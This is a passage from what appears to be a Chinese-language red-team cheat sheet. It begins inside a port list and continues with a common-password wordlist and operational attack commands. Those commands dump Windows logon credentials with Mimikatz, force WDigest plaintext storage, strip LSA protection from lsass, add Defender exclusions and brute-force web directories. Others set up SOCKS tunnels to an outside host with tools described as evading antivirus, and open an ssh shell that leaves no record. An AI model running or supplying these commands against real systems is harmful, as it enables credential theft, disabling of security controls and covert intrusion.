class="hljs-number">6100</span>-<span class="hljs-number">6101</span>,<span class="hljs-number">6106</span>,<span class="hljs-number">6112</span>,<span class="hljs-number">6123</span>,<span class="hljs-number">6129</span>,<span class="hljs-number">6156</span>,<span class="hljs-number">6346</span>,<span class="hljs-number">6389</span>,<span class="hljs-number">6502</span>,<span class="hljs-number">6510</span>,<span class="hljs-number">6543</span>,<span class="hljs-number">6547</span>,<span class="hljs-number">6565</span>-<span class="hljs-number">6567</span>,<span class="hljs-number">6580</span>,<span class="hljs-number">6646</span>,<span class="hljs-number">6666</span>-<span class="hljs-number">6669</span>,<span class="hljs-number">6689</span>,<span class="hljs-number">6692</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">6779</span>,<span class="hljs-number">6788</span>-<span class="hljs-number">6789</span>,<span class="hljs-number">6792</span>,<span class="hljs-number">6839</span>,<span class="hljs-number">6881</span>,<span class="hljs-number">6901</span>,<span class="hljs-number">6969</span>,<span class="hljs-number">7000</span>-<span class="hljs-number">7002</span>,<span class="hljs-number">7004</span>,<span class="hljs-number">7007</span>,<span class="hljs-number">7019</span>,<span class="hljs-number">7025</span>,<span class="hljs-number">7070</span>,<span class="hljs-number">7100</span>,<span class="hljs-number">7103</span>,<span class="hljs-number">7106</span>,<span class="hljs-number">7200</span>-<span class="hljs-number">7201</span>,<span class="hljs-number">7402</span>,<span class="hljs-number">7435</span>,<span class="hljs-number">7443</span>,<span class="hljs-number">7496</span>,<span class="hljs-number">7512</span>,<span class="hljs-number">7625</span>,<span class="hljs-number">7627</span>,<span class="hljs-number">7676</span>,<span class="hljs-number">7741</span>,<span class="hljs-number">7777</span>-<span class="hljs-number">7778</span>,<span class="hljs-number">7800</span>,<span class="hljs-number">7911</span>,<span class="hljs-number">7920</span>-<span class="hljs-number">7921</span>,<span class="hljs-number">7937</span>-<span class="hljs-number">7938</span>,<span class="hljs-number">7999</span>-<span class="hljs-number">8002</span>,<span class="hljs-number">8007</span>-<span class="hljs-number">8011</span>,<span class="hljs-number">8021</span>-<span class="hljs-number">8022</span>,<span class="hljs-number">8031</span>,<span class="hljs-number">8042</span>,<span class="hljs-number">8045</span>,<span class="hljs-number">8080</span>-<span class="hljs-number">8090</span>,<span class="hljs-number">8093</span>,<span class="hljs-number">8099</span>-<span class="hljs-number">8100</span>,<span class="hljs-number">8180</span>-<span class="hljs-number">8181</span>,<span class="hljs-number">8192</span>-<span class="hljs-number">8194</span>,<span class="hljs-number">8200</span>,<span class="hljs-number">8222</span>,<span class="hljs-number">8254</span>,<span class="hljs-number">8290</span>-<span class="hljs-number">8292</span>,<span class="hljs-number">8300</span>,<span class="hljs-number">8333</span>,<span class="hljs-number">8383</span>,<span class="hljs-number">8400</span>,<span class="hljs-number">8402</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">8500</span>,<span class="hljs-number">8600</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8651</span>-<span class="hljs-number">8652</span>,<span class="hljs-number">8654</span>,<span class="hljs-number">8701</span>,<span class="hljs-number">8800</span>,<span class="hljs-number">8873</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">8899</span>,<span class="hljs-number">8994</span>,<span class="hljs-number">9000</span>-<span class="hljs-number">9003</span>,<span class="hljs-number">9009</span>-<span class="hljs-number">9011</span>,<span class="hljs-number">9040</span>,<span class="hljs-number">9050</span>,<span class="hljs-number">9071</span>,<span class="hljs-number">9080</span>-<span class="hljs-number">9081</span>,<span class="hljs-number">9090</span>-<span class="hljs-number">9091</span>,<span class="hljs-number">9099</span>-<span class="hljs-number">9103</span>,<span class="hljs-number">9110</span>-<span class="hljs-number">9111</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9207</span>,<span class="hljs-number">9220</span>,<span class="hljs-number">9290</span>,<span class="hljs-number">9415</span>,<span class="hljs-number">9418</span>,<span class="hljs-number">9485</span>,<span class="hljs-number">9500</span>,<span class="hljs-number">9502</span>-<span class="hljs-number">9503</span>,<span class="hljs-number">9535</span>,<span class="hljs-number">9575</span>,<span class="hljs-number">9593</span>-<span class="hljs-number">9595</span>,<span class="hljs-number">9618</span>,<span class="hljs-number">9666</span>,<span class="hljs-number">9876</span>-<span class="hljs-number">9878</span>,<span class="hljs-number">9898</span>,<span class="hljs-number">9900</span>,<span class="hljs-number">9917</span>,<span class="hljs-number">9929</span>,<span class="hljs-number">9943</span>-<span class="hljs-number">9944</span>,<span class="hljs-number">9968</span>,<span class="hljs-number">9998</span>-<span class="hljs-number">10004</span>,<span class="hljs-number">10009</span>-<span class="hljs-number">10010</span>,<span class="hljs-number">10012</span>,<span class="hljs-number">10024</span>-<span class="hljs-number">10025</span>,<span class="hljs-number">10082</span>,<span class="hljs-number">10180</span>,<span class="hljs-number">10215</span>,<span class="hljs-number">10243</span>,<span class="hljs-number">10566</span>,<span class="hljs-number">10616</span>-<span class="hljs-number">10617</span>,<span class="hljs-number">10621</span>,<span class="hljs-number">10626</span>,<span class="hljs-number">10628</span>-<span class="hljs-number">10629</span>,<span class="hljs-number">10778</span>,<span class="hljs-number">11110</span>-<span class="hljs-number">11111</span>,<span class="hljs-number">11967</span>,<span class="hljs-number">12000</span>,<span class="hljs-number">12174</span>,<span class="hljs-number">12265</span>,<span class="hljs-number">12345</span>,<span class="hljs-number">13456</span>,<span class="hljs-number">13722</span>,<span class="hljs-number">13782</span>-<span class="hljs-number">13783</span>,<span class="hljs-number">14000</span>,<span class="hljs-number">14238</span>,<span class="hljs-number">14441</span>-<span class="hljs-number">14442</span>,<span class="hljs-number">15000</span>,<span class="hljs-number">15002</span>-<span class="hljs-number">15004</span>,<span class="hljs-number">15660</span>,<span class="hljs-number">15742</span>,<span class="hljs-number">16000</span>-<span class="hljs-number">16001</span>,<span class="hljs-number">16012</span>,<span class="hljs-number">16016</span>,<span class="hljs-number">16018</span>,<span class="hljs-number">16080</span>,<span class="hljs-number">16113</span>,<span class="hljs-number">16992</span>-<span class="hljs-number">16993</span>,<span class="hljs-number">17877</span>,<span class="hljs-number">17988</span>,<span class="hljs-number">18040</span>,<span class="hljs-number">18101</span>,<span class="hljs-number">18988</span>,<span class="hljs-number">19101</span>,<span class="hljs-number">19283</span>,<span class="hljs-number">19315</span>,<span class="hljs-number">19350</span>,<span class="hljs-number">19780</span>,<span class="hljs-number">19801</span>,<span class="hljs-number">19842</span>,<span class="hljs-number">20000</span>,<span class="hljs-number">20005</span>,<span class="hljs-number">20031</span>,<span class="hljs-number">20221</span>-<span class="hljs-number">20222</span>,<span class="hljs-number">20828</span>,<span class="hljs-number">21571</span>,<span class="hljs-number">22939</span>,<span class="hljs-number">23502</span>,<span class="hljs-number">24444</span>,<span class="hljs-number">24800</span>,<span class="hljs-number">25734</span>-<span class="hljs-number">25735</span>,<span class="hljs-number">26214</span>,<span class="hljs-number">27000</span>,<span class="hljs-number">27352</span>-<span class="hljs-number">27353</span>,<span class="hljs-number">27355</span>-<span class="hljs-number">27356</span>,<span class="hljs-number">27715</span>,<span class="hljs-number">28201</span>,<span class="hljs-number">30000</span>,<span class="hljs-number">30718</span>,<span class="hljs-number">30951</span>,<span class="hljs-number">31038</span>,<span class="hljs-number">31337</span>,<span class="hljs-number">32768</span>-<span class="hljs-number">32785</span>,<span class="hljs-number">33354</span>,<span class="hljs-number">33899</span>,<span class="hljs-number">34571</span>-<span class="hljs-number">34573</span>,<span class="hljs-number">35500</span>,<span class="hljs-number">38292</span>,<span class="hljs-number">40193</span>,<span class="hljs-number">40911</span>,<span class="hljs-number">41511</span>,<span class="hljs-number">42510</span>,<span class="hljs-number">44176</span>,<span class="hljs-number">44442</span>-<span class="hljs-number">44443</span>,<span class="hljs-number">44501</span>,<span class="hljs-number">45100</span>,<span class="hljs-number">48080</span>,<span class="hljs-number">49152</span>-<span class="hljs-number">49161</span>,<span class="hljs-number">49163</span>,<span class="hljs-number">49165</span>,<span class="hljs-number">49167</span>,<span class="hljs-number">49175</span>-<span class="hljs-number">49176</span>,<span class="hljs-number">49400</span>,<span class="hljs-number">49999</span>-<span class="hljs-number">50003</span>,<span class="hljs-number">50006</span>,<span class="hljs-number">50050</span>,<span class="hljs-number">50300</span>,<span class="hljs-number">50389</span>,<span class="hljs-number">50500</span>,<span class="hljs-number">50636</span>,<span class="hljs-number">50800</span>,<span class="hljs-number">51111</span>,<span class="hljs-number">51103</span>,<span class="hljs-number">51493</span>,<span class="hljs-number">52673</span>,<span class="hljs-number">52822</span>,<span class="hljs-number">52848</span>,<span class="hljs-number">52869</span>,<span class="hljs-number">54045</span>,<span class="hljs-number">54328</span>,<span class="hljs-number">55055</span>-<span class="hljs-number">55056</span>,<span class="hljs-number">55555</span>,<span class="hljs-number">55600</span>,<span class="hljs-number">56737</span>-<span class="hljs-number">56738</span>,<span class="hljs-number">57294</span>,<span class="hljs-number">57797</span>,<span class="hljs-number">58080</span>,<span class="hljs-number">60020</span>,<span class="hljs-number">60443</span>,<span class="hljs-number">61532</span>,<span class="hljs-number">61900</span>,<span class="hljs-number">62078</span>,<span class="hljs-number">63331</span>,<span class="hljs-number">64623</span>,<span class="hljs-number">64680</span>,<span class="hljs-number">65000</span>,<span class="hljs-number">65129</span>,<span class="hljs-number">65389</span><br><br></code></pre></td></tr></table></figure>

<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><details>
<summary>top200</summary>


<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">123456</span><br>password<br><span class="hljs-number">123456789</span><br><span class="hljs-number">12345678</span><br><span class="hljs-number">12345</span><br>qwerty<br><span class="hljs-number">123123</span><br><span class="hljs-number">111111</span><br>abc123<br><span class="hljs-number">1234567</span><br>dragon<br><span class="hljs-number">1</span>q2w3e4r<br>sunshine<br><span class="hljs-number">654321</span><br>master<br><span class="hljs-number">1234</span><br>football<br><span class="hljs-number">1234567890</span><br><span class="hljs-number">000000</span><br>computer<br><span class="hljs-number">666666</span><br>superman<br>michael<br>internet<br>iloveyou<br>daniel<br><span class="hljs-number">1</span>qaz2wsx<br>monkey<br><span class="hljs-keyword">shadow</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jessica</span><br><span class="hljs-keyword"></span>letmein<br><span class="hljs-keyword">baseball</span><br><span class="hljs-keyword"></span>whatever<br>princess<br>abcd1234<br><span class="hljs-number">123321</span><br>starwars<br><span class="hljs-number">121212</span><br>thomas<br>zxcvbnm<br>trustno1<br>killer<br>welcome<br><span class="hljs-keyword">jordan</span><br><span class="hljs-keyword"></span>aaaaaa<br><span class="hljs-number">123</span>qwe<br>freedom<br>password1<br>charlie<br><span class="hljs-keyword">batman</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jennifer</span><br><span class="hljs-keyword"></span><span class="hljs-number">7777777</span><br>michelle<br><span class="hljs-keyword">diamond</span><br><span class="hljs-keyword"></span>oliver<br>mercedes<br><span class="hljs-keyword">benjamin</span><br><span class="hljs-keyword"></span><span class="hljs-number">11111111</span><br>snoopy<br>samantha<br>victoria<br>matrix<br>george<br>alexander<br>secret<br>cookie<br>asdfgh<br><span class="hljs-number">987654321</span><br><span class="hljs-number">123</span>abc<br><span class="hljs-keyword">orange</span><br><span class="hljs-keyword"></span>fuckyou<br>asdf1234<br>pepper<br>hunter<br>silver<br><span class="hljs-keyword">joshua</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">banana</span><br><span class="hljs-keyword"></span><span class="hljs-number">1</span>q2w3e<br>chelsea<br><span class="hljs-number">1234</span>qwer<br>summer<br>qwertyuiop<br>phoenix<br><span class="hljs-keyword">andrew</span><br><span class="hljs-keyword"></span>q1w2e3r4<br>elephant<br>rainbow<br>mustang<br>merlin<br>london<br>garfield<br>robert<br>chocolate<br><span class="hljs-number">112233</span><br>samsung<br>qazwsx<br>matthew<br><span class="hljs-keyword">buster</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jonathan</span><br><span class="hljs-keyword"></span>ginger<br>flower<br><span class="hljs-number">555555</span><br>test<br>caroline<br>amanda<br>maverick<br>midnight<br>martin<br><span class="hljs-keyword">junior</span><br><span class="hljs-keyword"></span><span class="hljs-number">88888888</span><br>anthony<br><span class="hljs-keyword">jasmine</span><br><span class="hljs-keyword"></span>creative<br>patrick<br>mickey<br><span class="hljs-number">123</span><br>qwerty123<br>cocacola<br>chicken<br>passw0rd<br>forever<br>william<br>nicole<br>hello<br>yellow<br>nirvana<br><span class="hljs-keyword">justin</span><br><span class="hljs-keyword"></span>friends<br>cheese<br>tigger<br>mother<br>liverpool<br><span class="hljs-keyword">blink182</span><br><span class="hljs-keyword"></span>asdfghjkl<br><span class="hljs-keyword">andrea</span><br><span class="hljs-keyword"></span>spider<br><span class="hljs-keyword">scooter</span><br><span class="hljs-keyword"></span>richard<br>soccer<br>rachel<br>purple<br>morgan<br>melissa<br><span class="hljs-keyword">jackson</span><br><span class="hljs-keyword"></span>arsenal<br><span class="hljs-number">222222</span><br>qwe123<br>gabriel<br>ferrari<br><span class="hljs-keyword">jasper</span><br><span class="hljs-keyword"></span>danielle<br><span class="hljs-keyword">bandit</span><br><span class="hljs-keyword"></span>angela<br><span class="hljs-keyword">scorpion</span><br><span class="hljs-keyword"></span>prince<br>maggie<br>austin<br>veronica<br>nicholas<br>monster<br>dexter<br>carlos<br>thunder<br>success<br>hannah<br>ashley<br><span class="hljs-number">131313</span><br>stella<br><span class="hljs-keyword">brandon</span><br><span class="hljs-keyword"></span>pokemon<br><span class="hljs-keyword">joseph</span><br><span class="hljs-keyword"></span>asdfasdf<br><span class="hljs-number">999999</span><br>metallica<br>december<br>chester<br>taylor<br>sophie<br>samuel<br>rabbit<br>crystal<br><span class="hljs-keyword">barney</span><br><span class="hljs-keyword"></span>xxxxxx<br>steven<br>ranger<br>patricia<br>christian<br>asshole<br>spiderman<br>sandra<br>hockey<br>angels<br>security<br>parker<br>heather<br><span class="hljs-number">888888</span><br>victor<br>harley<br><span class="hljs-number">333333</span><br>system<br>slipknot<br>november<br><span class="hljs-keyword">jordan23</span><br><span class="hljs-keyword"></span>canada<br>tennis<br>qwertyui<br>casper<br></code></pre></td></tr></table></figure>

</details>


<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>一条命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.\mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>控制台执行多条命令，用log防止进程崩溃，数据丢失</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># privilege::debug</span><br>mimikatz <span class="hljs-comment"># log</span><br>mimikatz <span class="hljs-comment"># sekurlsa::logonpasswords</span><br>mimikatz <span class="hljs-comment"># sekurlsa::wdigest</span><br></code></pre></td></tr></table></figure>

<p>msf中执行命令</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mimikatz_command <span class="hljs-params">-f</span> sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span><br>mimikatz_command <span class="hljs-params">-f</span> sekurlsa<span class="hljs-type">::wdigest</span><br></code></pre></td></tr></table></figure>

<p>注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1</span><br></code></pre></td></tr></table></figure>

<h3 id="bypass-lsa-Protection-ppl"><a href="#bypass-lsa-Protection-ppl" class="headerlink" title="bypass lsa Protection(ppl)"></a>bypass lsa Protection(ppl)</h3><p>查询是否启用</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa<br><br></code></pre></td></tr></table></figure>

<p>把mimidriver.sys拷贝到同级目录，进行加载bypass</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># !+</span><br>mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe /remove</span><br>mimikatz <span class="hljs-comment"># privilege::debug    </span><br>mimikatz <span class="hljs-comment"># token::elevate</span><br>mimikatz <span class="hljs-comment"># sekurlsa::logonpasswords</span><br>mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe</span><br>mimikatz <span class="hljs-comment"># !-</span><br></code></pre></td></tr></table></figure>





<h2 id="cs凭证解析"><a href="#cs凭证解析" class="headerlink" title="cs凭证解析"></a>cs凭证解析</h2><p>提取用户名</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> -F<span class="hljs-string">&quot;:::&quot;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> credentials.txt | awk -F<span class="hljs-string">&quot;\\&quot;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$2</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>提取hash</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> -F<span class="hljs-string">&quot;:::&quot;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$2</span>&#125;&#x27;</span> credentials.txt<br></code></pre></td></tr></table></figure>





<h2 id="存活主机"><a href="#存活主机" class="headerlink" title="存活主机"></a>存活主机</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">256</span>) DO @ping -w <span class="hljs-number">1</span> -l <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">202</span>.%I | findstr “TTL=”<br></code></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Defender排除项</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell -ExecutionPolicy <span class="hljs-keyword">Bypass </span><span class="hljs-keyword">Add-MpPreference </span>-ExclusionPath <span class="hljs-string">&quot;C:\test&quot;</span><br><br></code></pre></td></tr></table></figure>

<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster dir -u https:<span class="hljs-regexp">//</span>buffered.io -w ~<span class="hljs-regexp">/wordlists/</span>shortlist.txt<br></code></pre></td></tr></table></figure>

<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 dirsearch<span class="hljs-selector-class">.py</span> -e php,<span class="hljs-selector-tag">html</span>,js -u https:<span class="hljs-comment">//target</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 dirsearch.py -e php,html,js -u https:<span class="hljs-regexp">//</span>target -w <span class="hljs-regexp">/path/</span>to/wordlist<br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https:<span class="hljs-regexp">//</span>target -t <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> dirsearch.py -e php,html,js -u https://target --proxy <span class="hljs-number">127.0.0.1:8080</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 dirsearch.py -e php,html,js -u https:<span class="hljs-regexp">//</span>target --proxy socks5:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbtscan</span>.exe <span class="hljs-number">10.11.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><p>proxychain<br>sockscap64<br>proxifier   </p>
<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti">https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti</a><br><a target="_blank" rel="noopener" href="https://www.mediafire.com/folder/32rj1769a2w82/v4.7">https://www.mediafire.com/folder/32rj1769a2w82/v4.7</a>   </p>
<h2 id="内网穿透工具"><a href="#内网穿透工具" class="headerlink" title="内网穿透工具"></a>内网穿透工具</h2><h3 id="fuso"><a href="#fuso" class="headerlink" title="fuso"></a>fuso</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/editso/fuso.git">https://github.com/editso/fuso.git</a>   </li>
<li>相对冷门，不会被杀<br>在9004上开启socks5代理</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fuc</span>.exe <span class="hljs-number">159.138.0.0</span> <span class="hljs-number">9003</span> -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">9004</span> -b <span class="hljs-number">9004</span> -n test -t socks5 --bridge-host <span class="hljs-number">0.0.0.0</span> --bridge-port <span class="hljs-number">9004</span><br></code></pre></td></tr></table></figure>

<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a target="_blank" rel="noopener" href="https://github.com/lz520520/Stowaway">https://github.com/lz520520/Stowaway</a></p>
<h3 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h3><p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p>
<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>无记录shell</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh -T root@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-regexp">/usr/</span>bin/bash -i<br></code></pre></td></tr></table></figure>

<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">grep -E &quot;([0-9]</span><span class="hljs-template-variable">&#123;1,3&#125;</span><span class="language-xml">[\.])</span><span class="hljs-template-variable">&#123;3&#125;</span><span class="language-xml">[0-9]</span><span class="hljs-template-variable">&#123;1,3&#125;</span><span class="language-xml">&quot; -r xxx --color=auto</span><br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">grep -E <span class="hljs-string">&quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot;</span> -r xxx <span class="hljs-attribute">--color</span>=auto<br></code></pre></td></tr></table></figure>

